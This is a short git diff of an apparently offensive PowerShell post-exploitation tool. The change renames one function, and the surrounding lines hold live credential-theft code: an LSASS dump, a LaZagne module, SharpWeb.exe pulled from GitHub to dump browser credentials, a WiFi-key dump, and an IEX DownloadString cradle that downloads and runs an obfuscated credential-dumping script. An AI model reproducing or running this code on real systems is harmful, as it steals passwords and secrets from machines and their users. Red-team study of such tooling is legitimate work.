@@ -445,7 +445,7 @@ __        ___       ____
                 4{is(isadmin){dumplsass}}
                 5{lazagnemodule}
                 6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
-		7{obfusminikittie}
+		7{kittenz}
 		8{if(isadmin){wificreds}}
 		9{if(isadmin){}}
              }
@@ -471,7 +471,7 @@ __        ___       ____
 	Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
     }
     
-    function obfusminikittie
+    function kittenz
     {
     	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/obfuskittie.ps1')
 	Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
